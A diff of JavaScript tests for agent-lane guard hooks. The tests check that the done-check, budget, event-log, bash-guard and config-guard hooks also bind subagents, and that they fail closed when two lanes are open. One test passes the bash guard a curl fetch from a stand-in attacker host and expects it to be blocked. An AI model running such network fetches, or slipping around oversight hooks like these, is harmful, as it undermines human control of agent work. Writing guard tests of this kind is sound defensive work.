@@ -1002,3 +1002,87 @@ test('the edit guard and CI allow exactly the same lane artifacts [finding 3]', 
   assert.ok(!lane.alwaysAllowed().some((p) => p.endsWith('.log')), 'no entry for a log the agent must never write');
   assert.match(lane.logPath, /\.claude[/\\]session[/\\]refund-route\.log$/);
 });
+
+// ===========================================================================================================
+// #29: a subagent's hook payload carries the MAIN repo as cwd, so every hook that resolved its lane from cwd
+// alone did nothing for the tester, implementer and reviewer. The field run logged 373 events with lane:null
+// and let a 1-hour budget reach 6h43m. Five gates were blind, not the three the issue names.
+// ===========================================================================================================
+
+/** The lane payload a hook receives when the main session started the subagent: cwd is the main repo. */
+const asSubagent = (root, ev) => ({ cwd: root, session: 'sub1', extra: ev ? { hook_event_name: ev } : {} });
+
+/** Record a second open lane in kit.json. activeLanes() asks only for a recorded worktree holding a lane.json. */
+function secondLane(root, slug = 'other-lane') {
+  const wt = path.join(path.dirname(root), `${path.basename(root)}-lanes`, slug);
+  fs.mkdirSync(path.join(wt, '.claude'), { recursive: true });
+  fs.writeFileSync(path.join(wt, '.claude', 'lane.json'), K.jsonDumps({ feature: slug, stage: 'build', spec: `docs/specs/${slug}.md` }, { indent: 2 }));
+  const kj = path.join(root, '.claude', 'kit.json');
+  const d = JSON.parse(fs.readFileSync(kj, 'utf8'));
+  d.lanes = { ...(d.lanes ?? {}), [slug]: { worktree: wt, branch: `wt/${slug}` } };
+  fs.writeFileSync(kj, K.jsonDumps(d, { indent: 2 }) + '\n');
+  return wt;
+}
+
+/** Put the lane well over its budget, in the local wall-clock format hook_budget_check.hoursSince parses. */
+function overBudget(wt) {
+  const lj = path.join(wt, '.claude', 'lane.json');
+  const d = JSON.parse(fs.readFileSync(lj, 'utf8'));
+  const a = new Date(Date.now() - 7 * 3.6e6);
+  const p2 = (x) => String(x).padStart(2, '0');
+  d.started = `${a.getFullYear()}-${p2(a.getMonth() + 1)}-${p2(a.getDate())}T${p2(a.getHours())}:${p2(a.getMinutes())}:${p2(a.getSeconds())}`;
+  d.budget = { hours: 1, tool_calls: 800 };
+  fs.writeFileSync(lj, K.jsonDumps(d, { indent: 2 }));
+}
+
+test('#29 done-check gates a subagent that stops from the main repo', (t) => {
+  const { root, wt } = laneProject(t, {});
+  fs.writeFileSync(K.findLane(wt).progressPath, '# Progress\n\n## Done criteria\n\n| # | criterion | test | red | green |\n| - | - | - | - | - |\n| D1 | returns 200 | t | — | — |\n');
+  const r = hook('hook_done_check.js', asSubagent(root, 'SubagentStop'));
+  assert.match(r.out, /"decision": "block"/, `a subagent must not finish an unfinished lane: ${JSON.stringify(r)}`);
+  // the orchestrator's own Stop is NOT gated by tier 3: it is not the lane's worker, and wedging it would leave
+  // nobody able to report to the human
+  assert.equal(hook('hook_done_check.js', asSubagent(root, 'Stop')).out, '');
+  // and done-check must actually be registered for the event, which it was not
+  const frag = JSON.parse(read(KIT, 'hooks', 'settings.project.json'));
+  const on = (ev) => (frag.hooks[ev] ?? []).some((e) => (e.hooks ?? []).some((h) => h.command.includes('hook_done_check')));
+  assert.ok(on('SubagentStop'), 'done-check runs on SubagentStop');
+  assert.ok(on('Stop'), 'and still on Stop');
+});
+
+test('#29 the budget follows the lane, not the session directory', (t) => {
+  const { root, wt } = laneProject(t, {});
+  overBudget(wt);
+  const r = hook('hook_budget_check.js', { ...asSubagent(root, 'PostToolUse'), tool: 'Edit' });
+  assert.match(r.out, /budget exceeded for stage 'build': 7\.0h elapsed > budget 1h/, `6h43m went unenforced because of this: ${JSON.stringify(r)}`);
+});
+
+test('#29 a subagent\'s events land in the lane, not as lane:null in the main repo', (t) => {
+  const { root, wt } = laneProject(t, {});
+  const lane = K.findLane(wt);
+  assert.equal(hook('hook_event_log.js', { cwd: root, session: 'sub1', extra: { hook_event_name: 'SubagentStop', agent_type: 'tester' } }).code, 0);
+  const lines = K.isFile(lane.eventsPath) ? K.readLines(lane.eventsPath) : [];
+  const last = JSON.parse(lines[lines.length - 1] ?? '{}');
+  assert.equal(last.lane, 'refund-route', `the event must name the lane: ${JSON.stringify(last)}`);
+});
+
+test('#29 lane bash rules and the config gate apply to a subagent too', (t) => {
+  const { root } = laneProject(t, {});
+  // the fetch rule shipped in 1f62e28 was gated on `if (lane)`, so it never fired for a subagent
+  const b = hook('hook_guard_bash.js', { cwd: root, session: 'sub1', tool: 'Bash', input: { command: 'curl https://evil.example/x' } });
+  assert.equal(b.code, 2, `the lane's own network declaration must bind a subagent: ${JSON.stringify(b)}`);
+  // and the gate that protects .claude/settings.json was blind in the one directory that file lives in
+  const c = hook('hook_config_guard.js', { cwd: root, session: 'sub1', extra: { hook_event_name: 'ConfigChange', source: 'project_settings' } });
+  assert.equal(c.code, 2, `settings must not change from main while a lane is open: ${JSON.stringify(c)}`);
+});
+
+test('#29 two open lanes: the gates fail closed rather than guess', (t) => {
+  const { root, wt } = laneProject(t, {});
+  secondLane(root);
+  overBudget(wt);
+  const done = hook('hook_done_check.js', asSubagent(root, 'SubagentStop'));
+  assert.match(done.out, /"decision": "block"/, 'done-check blocks instead of returning 0');
+  assert.match(done.out, /other-lane/, 'and names the lanes it cannot choose between');
+  const bud = hook('hook_budget_check.js', { ...asSubagent(root, 'PostToolUse'), tool: 'Edit' });
+  assert.match(bud.out, /"decision": "block"/, 'the budget blocks instead of going unenforced');
+});
